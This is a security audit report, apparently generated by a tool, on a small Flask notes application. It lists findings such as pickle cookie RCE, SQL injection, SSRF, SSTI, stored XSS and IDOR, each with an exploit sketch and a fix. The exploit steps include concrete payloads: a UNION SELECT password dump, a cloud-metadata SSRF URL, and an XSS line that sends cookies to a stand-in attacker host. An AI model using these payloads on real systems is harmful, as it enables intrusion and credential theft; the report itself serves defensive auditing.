# Security Assessment — 2026-08-30 — coder_ornith

graphify-out not available


## Attack surface

### Entry points
| # | Type | Location | Auth required | Description |
|---|------|----------|---------------|-------------|
| 1 | HTTP GET/POST | routes/login.py:17-22 | No | Login form; email+password verified against User model |
| 2 | HTTP GET/POST | routes/signup.py:28-33 | No | Registration; validates registration_code, creates User with hashpw |
| 3 | HTTP GET | routes/account.py:24-26 | Yes (@login_required) | /search; request.args['search'] interpolated into SQL f-string |
| 4 | HTTP POST | routes/account.py:51 | Yes | /account/image; ImageForm url field downloaded via urlopen() |
| 5 | HTTP POST | routes/account.py:98 | Yes | /darkmode; toggles preferences cookie via pickle dumps |
| 6 | HTTP GET/POST | routes/notes.py:10-16 | Yes | /notes; NoteForm creates notes scoped to current_user |
| 7 | HTTP POST | routes/notes.py:39 | Yes | /notes/<id>/delete; deletes note by id |
| 8 | HTTP POST | routes/registration_codes.py:26 | Unknown (admin?) | /registration-codes; generates registration codes |
| 9 | Framework hook | routes/account.py:112-120 | No | @app.before_request; deserializes 'preferences' cookie via pickle.loads on every request |
| 10 | CLI | db_seed.py:1 | No | Seeds DB with registration codes + admin/user/note fixtures |

### Trust boundaries
| # | Boundary | Location | Data type |
|---|----------|----------|-----------|
| 1 | Cookie -> pickle.loads | routes/account.py:118 | Untrusted 'preferences' cookie bytes |
| 2 | Form field -> SQL f-string | routes/signup.py:17 | registration_code input |
| 3 | Query param -> SQL f-string | routes/account.py:33 | 'search' URL param |
| 4 | Form url -> urlopen() | utils/profile_image.py:7 | User-supplied image URL |
| 5 | Hardcoded secret_key | app.py:11 | Session cookie signing key |

### Notes
- Unauthenticated entry points: /login, /signup, /, and the @app.before_request hook (runs for every request before routing).
- routes/account.py imports `from pickle import dumps, loads` (account.py:1) and uses pickle for the preferences cookie round-trip; signup/notes/login routes use json.dumps for flash messages (not pickle).
- Two SQL injections use SQLAlchemy `text(f"...")` with direct f-string interpolation of untrusted input.
- SSRF sink: utils/profile_image.py urlopen(url) on user-supplied URL.

## Scanned files
- app.py
- db_seed.py
- forms/__init__.py
- forms/account_form.py
- forms/image_form.py
- forms/login_form.py
- forms/note_form.py
- forms/registration_form.py
- models/__init__.py
- models/base_model.py
- models/note.py
- models/registration_code.py
- models/user.py
- routes/__init__.py
- routes/account.py
- routes/home.py
- routes/login.py
- routes/notes.py
- routes/registration_codes.py
- routes/signup.py
- utils/__init__.py
- utils/notes.py
- utils/profile_image.py

## Findings

### routes/account.py:112-118 — Pickle Deserialization of Untrusted Cookie (RCE)
**CWE:** CWE-502 Unsafe Deserialization
**Reachability:** ACTIVE
**Impact:** CRITICAL
**Likelihood:** HIGH
**Confidence:** CONFIRMED
**Severity:** Impact [CRITICAL] x Likelihood [HIGH] = CRITICAL (ACTIVE, no adjustment)

**Data flow:**
Source:     routes/account.py:114 — request.cookies.get('preferences') (attacker-controlled cookie)
Transform:  routes/account.py:118 — b64decode() then pickle.loads() on decoded bytes
Sink:       routes/account.py:118 — pickle object deserialization runs arbitrary __reduce__
**Exploit:** 1. Attacker crafts HTTP request with 'preferences' cookie = base64(pickle.dumps(obj)) where obj implements __reduce__ -> 2. @app.before_request (account.py:112) runs on every request and calls loads(b64decode(preferences)) at line 118 -> 3. Remote code execution (e.g., os.system via pickle reduce) with no authentication.
**Mitigations:** None. No signature, no allowlist, no separate signing key.
**Fix:** Do not use pickle for cookie data. Store preferences as JSON (json.dumps/json.loads) or store only a signed token; decode and validate structure before use.

```python
preferences = request.cookies.get('preferences')
if preferences is None:
    preferences = default_preferences
else:
    preferences = loads(b64decode(preferences))
```

### routes/account.py:27-33 — SQL Injection in Search
**CWE:** CWE-89 SQL Injection
**Reachability:** ACTIVE
**Impact:** HIGH
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [MEDIUM] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     routes/account.py:27 — request.args.get('search', '') (user-supplied query param)
Transform:  routes/account.py:31-32 — combined into Note.filter(...) with user scope
Sink:       routes/account.py:33 — text(f"text like '%{search_param}%'") interpolates raw into SQL
**Exploit:** 1. Authenticated user hits /search?search=' UNION SELECT password,email FROM users-- -> 2. f-string injects payload into the text() SQL at line 33, bypassing the current_user.id scope -> 3. Extract arbitrary rows (credentials, other users' notes).
**Mitigations:** None. f-string interpolation into text() bypasses SQLAlchemy parameterization.
**Fix:** Use bound parameter: `text("text LIKE :q").bindparams(q=f"%{search_param}%")` or use Note.text.ilike(search_param) in the ORM filter.

```python
personal_notes = session.query(Note).filter(
    Note.user_id == current_user.id,
    text(f"text like '%{search_param}%'")).all()
```

### routes/signup.py:13-18 — SQL Injection in Registration Code Validation
**CWE:** CWE-89 SQL Injection
**Reachability:** ACTIVE
**Impact:** HIGH
**Likelihood:** HIGH
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [HIGH] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     routes/signup.py:45 — code = form.registration_code.data (public registration form field)
Transform:  routes/signup.py:46 — validate_token(code, session) called with form input
Sink:       routes/signup.py:17 — text(f"...WHERE code = '{code}'") interpolates raw into SQL
**Exploit:** 1. Attacker submits /signup POST with registration_code = ' OR '1'='1 -> 2. validate_token interpolates into text() at line 17 -> 3. Boolean/UNION injection bypasses code validation or leaks registration codes and user data.
**Mitigations:** Wrapped in try/except OperationalError (signup.py:24) but does not prevent injection; only swallows errors.
**Fix:** Parameterize: `text("SELECT id, code FROM {table} WHERE code = :c").bindparams(c=code)` with the table name from RegistrationCode.__tablename__ (trusted), not interpolated.

```python
result = session.execute(
    text(f"""
        SELECT id, code FROM {RegistrationCode.__tablename__} WHERE code = '{code}'
    """)).first()
```

### utils/profile_image.py:1-12 — Server-Side Request Forgery in Image Download
**CWE:** CWE-918 SSRF
**Reachability:** ACTIVE
**Impact:** HIGH
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [MEDIUM] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     routes/account.py:60-61 — get_base64_image_blob(form.url.data) from ImageForm.url (authenticated POST /account/image)
Transform:  utils/profile_image.py:12 — download(url) called with user-supplied URL
Sink:       utils/profile_image.py:7 — urlopen(url) fetches arbitrary URL server-side
**Exploit:** 1. Authenticated user POSTs /account/image with url=http://169.254.169.254/latest/meta-data/ -> 2. urlopen() at line 7 fetches the metadata endpoint from the server's network context -> 3. Retrieve cloud instance credentials / internal service data.
**Mitigations:** None. No URL scheme, host, or range validation.
**Fix:** Validate URL scheme (https/http only), resolve and block private/loopback/link-local/metadata ranges, and allowlist permitted hosts before urlopen().

```python
def download(url: str) -> bytes:
    with urlopen(url) as response:
        return response.read()
```

### routes/notes.py:39-52 — IDOR on Note Deletion
**CWE:** CWE-284 Access Control
**Reachability:** ACTIVE
**Impact:** MODERATE
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [MODERATE] x Likelihood [MEDIUM] = MEDIUM (ACTIVE, no adjustment)

**Data flow:**
Source:     routes/notes.py:41 — note_id from URL route <int:note_id> (attacker-controlled)
Transform:  routes/notes.py:44 — session.get(Note, note_id) fetches by ID, no ownership check
Sink:       routes/notes.py:48 — session.delete(note) deletes any note regardless of owner
**Exploit:** 1. Authenticated attacker enumerates note_id (sequential PK) -> 2. POSTs /notes/<victim_note_id>/delete -> 3. Deletes another user's note without ownership verification.
**Mitigations:** None. No `note.user_id == current_user.id` check before delete.
**Fix:** Load the note and assert `note.user_id == current_user.id` (or scope the query to current_user) before deleting; return 403 otherwise.

```python
note = session.get(Note, note_id)
if note is None:
    flash('Note not found', 'warning')
else:
    session.delete(note)
    session.commit()
```

### templates/home.html:31 — Stored XSS via Note Text
**CWE:** CWE-79 XSS
**Reachability:** ACTIVE
**Impact:** MODERATE
**Likelihood:** HIGH
**Confidence:** CONFIRMED
**Severity:** Impact [MODERATE] x Likelihood [HIGH] = MEDIUM (ACTIVE, no adjustment)

**Data flow:**
Source:     routes/notes.py:28 — form.text.data (user-supplied note body stored in DB)
Transform:  routes/notes.py:31-32 — Note.text persisted via session.add/commit
Sink:       templates/home.html:31 — {{ note.text | safe }} renders body without HTML escaping
**Exploit:** 1. Attacker creates a note whose text contains `<img src=x onerror=fetch('http://attacker/?c='+document.cookie)>` -> 2. Note stored in DB (notes.py:31) -> 3. Any page rendering notes (home.html:31, or /accounts/<user_id>/notes) executes the payload unescaped via | safe.
**Mitigations:** None. | safe forces unescaped rendering of attacker-controlled content.
**Fix:** Remove the `| safe` filter so Jinja2 autoescapes: `{{ note.text }}`. If rich text is required, sanitize with an allowlist HTML sanitizer (e.g., bleach) server-side.

```html
<p class="card-text">{{ note.text | safe }}</p>
```

### app.py:31-33 — Server-Side Template Injection in 404 Handler
**CWE:** CWE-94 Code Injection
**Reachability:** ACTIVE
**Impact:** HIGH
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [MEDIUM] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     app.py:32 — request.path (attacker-controlled URL path)
Transform:  app.py:31-32 — f-string injects request.path into template source passed to render_template_string
Sink:       app.py:32 — render_template_string() compiles/renders attacker-influenced Jinja2 template
**Exploit:** 1. Attacker requests a non-existent route containing Jinja2 syntax, e.g. GET /{{7*7}} (URL-encoded path) -> 2. Flask 404 triggers page_not_found handler, which builds the template via f-string including request.path at line 32 -> 3. render_template_string evaluates `{{7*7}}` -> 49; Jinja2 sandbox escape yields RCE.
**Mitigations:** None. render_template_string with dynamic, user-influenced source.
**Fix:** Never pass user input to render_template_string. Build the 404 message with string concatenation/format into a plain string and pass it as a template variable: `render_template('404.html', detailed_message="... " + request.path)`.

```python
@app.errorhandler(404)
def page_not_found(error):
    detailed_message = render_template_string(
        f"{error}. Requested URL was {request.path}"
    )
    return render_template("404.html", detailed_message=detailed_message)
```

### app.py:11 — Hardcoded Session Secret Key
**CWE:** CWE-259 Hardcoded Password
**Reachability:** ACTIVE
**Impact:** HIGH
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [MEDIUM] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     app.py:11 — app.secret_key = "super secret key" compiled into source (committed to VCS)
Transform:  app.py:11 — Flask uses secret_key to sign all session cookies
Sink:       app.py:11 — any party with the key forges arbitrary session cookies
**Exploit:** 1. Attacker reads source (public repo or dependency of the image) -> 2. Uses the known key "super secret key" to sign a session cookie for an arbitrary user id via the Flask user_loader (routes/login.py:12-14) -> 3. Auth bypass / account takeover.
**Mitigations:** None. Key is hardcoded and unencrypted in source.
**Fix:** Load secret_key from an environment variable or secret manager: `app.secret_key = os.environ["FLASK_SECRET_KEY"]`; rotate the exposed key.

```python
app = Flask(__name__)
app.secret_key = "super secret key"
```

### db_seed.py:18-19 — Default Admin Credentials Seeded at Startup
**CWE:** CWE-259 Hardcoded Password
**Reachability:** ACTIVE
**Impact:** HIGH
**Likelihood:** HIGH
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [HIGH] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     db_seed.py:18-19 — User('admin@evfa.com', hashpw(b'admin', ...), True)
Transform:  db_seed.py:6-23 — setup_db() runs on app startup (app.py:21); seeds admin if no users exist
Sink:       routes/login.py:32-34 — checkpw accepts the well-known password 'admin' and login_user() authenticates
**Exploit:** 1. Attacker logs in at /login with admin@evfa.com / 'admin' -> 2. checkpw matches the seeded bcrypt hash (db_seed.py:19) -> 3. Full admin access (registration-code management, etc.).
**Mitigations:** None. Passwords are weak ('user'/'admin') and known; seeded on every fresh DB.
**Fix:** Do not seed default credentials in production; require admin creation via a secure provisioning path with a strong, randomly generated password. Rotate the exposed credentials.

```python
admin = User('admin@evfa.com',
             hashpw(b'admin', gensalt()).decode(), True)
```

### db_seed.py:9 — Hardcoded Registration Code
**CWE:** CWE-259 Hardcoded Password
**Reachability:** ACTIVE
**Impact:** LOW
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [LOW] x Likelihood [MEDIUM] = LOW (ACTIVE, no adjustment)

**Data flow:**
Source:     db_seed.py:9 — static_code = 'a36e990b-0024-4d55-b74a-f8d7528e1764' hardcoded
Transform:  db_seed.py:10 — RegistrationCode(static_code) seeded on startup
Sink:     routes/signup.py:17 — validate_token accepts the known code, bypassing code issuance control
**Exploit:** 1. Attacker reads source for the hardcoded code -> 2. Uses it at /signup to bypass the registration-code gating -> 3. Registers accounts without admin-issued codes.
**Mitigations:** None. Static code is committed to the repo.
**Fix:** Generate registration codes at runtime (see db_seed.py:13) rather than hardcoding a permanent master code; do not commit known codes to source control.

```python
static_code = 'a36e990b-0024-4d55-b74a-f8d7528e1764'
session.add(RegistrationCode(static_code))
```

### routes/*.py — Missing CSRF Protection on State-Changing Endpoints
**CWE:** CWE-352 CSRF
**Reachability:** ACTIVE
**Impact:** MODERATE
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [MODERATE] x Likelihood [MEDIUM] = MEDIUM (ACTIVE, no adjustment)

**Data flow:**
Source:     Any cross-site forged request (browser auto-includes signed session cookie)
Transform:  forms/*.py use `wtforms.Form` (not FlaskForm) — no CSRF token embedded (e.g. forms/login_form.py:1)
Sink:       State-changing POST routes accept requests with no token/SameSite check: /account/image (routes/account.py:51), /darkmode (routes/account.py:98), /registration-codes (routes/registration_codes.py:26), /notes (routes/notes.py:16)
**Exploit:** 1. Attacker hosts a page that auto-submits a form/post to an authenticated victim's /account/image -> 2. Browser sends the signed session cookie cross-site (no SameSite attribute configured) -> 3. Server performs the state change without a CSRF token (e.g. triggers server-side SSRF download, toggles dark mode, or creates admin codes).
**Mitigations:** None. No flask-wtf CSRFProtect, no CSRF token in forms, no SESSION_COOKIE_SAMESITE set. Browser SameSite=Lax default partially mitigates cross-site POST.
**Fix:** Add flask-wtf CSRFProtect (or equivalent) globally, use FlaskForm with embedded tokens, and set SESSION_COOKIE_SAMESITE='Lax' (or 'Strict').

```python
# forms/login_form.py
from wtforms import Form, PasswordField, validators, EmailField

class LoginForm(Form):
    email = EmailField('Email Address', [validators.DataRequired()])
    password = PasswordField('Password', [validators.DataRequired()])
```

### routes/account.py:68-92 + forms/account_form.py:7 — Privilege Escalation via is_admin
**CWE:** CWE-284 Access Control
**Reachability:** ACTIVE
**Impact:** CRITICAL
**Likelihood:** MEDIUM
**Confidence:** CONFIRMED
**Severity:** Impact [CRITICAL] x Likelihood [MEDIUM] = HIGH (ACTIVE, no adjustment)

**Data flow:**
Source:     forms/account_form.py:7 — `is_admin = BooleanField('Is Admin')`; submitted in /account POST (routes/account.py:70)
Transform:  routes/account.py:76-80 — filtered_values comprehension excludes only 'password', so is_admin is retained
Sink:       routes/account.py:81,92 — current_user.__dict__.update(filtered_values) sets is_admin=True; session.merge + commit persists admin flag
**Exploit:** 1. Authenticated user submits /account POST with is_admin=checked -> 2. update_account builds filtered_values excluding only 'password' (account.py:77-79), retaining is_admin -> 3. current_user is merged with is_admin=True and committed, granting admin access (registration-code management, etc.).
**Mitigations:** None. The filter whitelists by exclusion and does not strip privileged fields.
**Fix:** Explicitly whitelist allowed updatable fields (e.g. email) and never allow is_admin to flow from form data; re-derive admin from the database role, not client input.

```python
filtered_values = {
    key: value
    for key, value in form.data.items()
    if value is not None and key != 'password'
}
current_user.__dict__.update(filtered_values)
```

### models/__init__.py:14 — SQL Echo Enabled (Info Exposure)
**CWE:** CWE-200 Info Exposure
**Reachability:** ACTIVE
**Impact:** LOW
**Likelihood:** LOW
**Confidence:** CONFIRMED
**Severity:** Impact [LOW] x Likelihood [LOW] = LOW (ACTIVE, no adjustment)

**Data flow:**
Source:     models/__init__.py:14 — create_engine(..., echo=True)
Transform:  echo=True dumps every executed SQL statement and parameters to stdout
Sink:       Application logs / console capture all queries (including rows tied to user passwords, emails, notes)
**Exploit:** 1. Attacker with access to logs/console captures the verbose SQL dump -> 2. Extracts sensitive query contents (hashed passwords, PII) from logged statements.
**Mitigations:** None. Echo is hardcoded on for all environments.
**Fix:** Remove `echo=True` (or gate it behind a debug config flag) in production.

```python
engine: Engine = create_engine(
    'sqlite:///' + path.join(basedir, '..', 'database.db'),
    echo=True,
)
```

## Dependency findings

### click@8.1.7 — CVE-2026-7246 Command Injection in click.edit()
**CVE:** CVE-2026-7246 (PYSEC-2026-2132)
**CWE:** CWE-78 Command Injection
**Reachability:** DEAD — click.edit() not called in codebase; click present only transitively via Flask CLI
**Impact:** HIGH
**Likelihood:** LOW
**Confidence:** CONFIRMED
**Severity:** Impact [HIGH] x Likelihood [LOW] = MEDIUM (DEAD, capped from HIGH — dead code)

**Vulnerable path:** click is a transitive dependency of Flask (used for its CLI). The vulnerable function `click.edit()` (opens an editor and passes arbitrary OS commands) is never invoked by this app.
**Fixed in:** 8.3.3
**Fix:** Upgrade: `click==8.3.3` (or later).

### flask@3.1.1 — CVE-2026-27205 Missing Vary: Cookie on Session Access
**CVE:** CVE-2026-27205 (PYSEC-2026-2151)
**CWE:** CWE-200 Info Exposure
**Reachability:** ACTIVE — Flask is the app framework; session accessed on every request via Flask-Login
**Impact:** LOW
**Likelihood:** LOW
**Confidence:** CONFIRMED
**Severity:** Impact [LOW] x Likelihood [LOW] = LOW (ACTIVE, no adjustment)

**Vulnerable path:** Flask sets `Vary: Cookie` for most session access but overlooks accesses that only touch keys (e.g. `in` operator) without reading/mutating. Behind a caching proxy that does not honor `Vary` and without a `Cache-Control: private` header, a cached response may expose a logged-in user's data.
**Fixed in:** 3.1.3
**Fix:** Upgrade: `Flask==3.1.3` (or later); ensure any caching proxy respects Vary or set Cache-Control: private on session-bearing responses.

### werkzeug@3.1.5 — CVE-2026-27199 Windows Device-Name DoS in safe_join
**CVE:** CVE-2026-27199 (PYSEC-2026-2320)
**CWE:** CWE-78 Command Injection
**Reachability:** DEAD — vulnerable only on Windows (device names like NUL); app runs on Linux (Docker `python:3.13-slim-trixie`); `send_from_directory`/`safe_join` not used in codebase
**Impact:** LOW
**Likelihood:** LOW
**Confidence:** CONFIRMED
**Severity:** Impact [LOW] x Likelihood [LOW] = LOW (DEAD, capped from LOW)

**Vulnerable path:** `safe_join` (used by `send_from_directory`) allows Windows device names preceded by path segments (e.g. `example/NUL`); on Windows the file opens but reading hangs indefinitely (DoS). Not reachable: target OS is Linux and neither function is called.
**Fixed in:** 3.1.6
**Fix:** Upgrade: `Werkzeug==3.1.6` (or later) as defense-in-depth.

## Findings summary

| # | Title | Severity | Confidence |
|---|-------|----------|------------|
| 1 | Pickle deserialization of untrusted cookie (RCE) | CRITICAL | CONFIRMED |
| 2 | SQL injection in search query | HIGH | CONFIRMED |
| 3 | SQL injection in registration token validation | HIGH | CONFIRMED |
| 4 | SSRF via profile image URL | HIGH | CONFIRMED |
| 5 | IDOR on note deletion | MEDIUM | CONFIRMED |
| 6 | Stored XSS in note text | MEDIUM | CONFIRMED |
| 7 | SSTI in 404 handler | HIGH | CONFIRMED |
| 8 | Hardcoded session secret key | HIGH | CONFIRMED |
| 9 | Privilege escalation via is_admin | HIGH | CONFIRMED |
| 10 | Default admin credentials on startup | HIGH | CONFIRMED |
| 11 | Hardcoded registration code | LOW | CONFIRMED |
| 12 | Missing CSRF protection | MEDIUM | CONFIRMED |
| 13 | SQL echo in database config | LOW | CONFIRMED |
| 14 | Command injection in click.edit() (click@8.1.7) | MEDIUM | CONFIRMED (DEAD) |
| 15 | Missing Vary: Cookie on session access (flask@3.1.1) | LOW | CONFIRMED |
| 16 | Windows device-name DoS in safe_join (werkzeug@3.1.5) | LOW | CONFIRMED (DEAD) |

**Totals:** CRITICAL: 1, HIGH: 7, MEDIUM: 4, LOW: 4
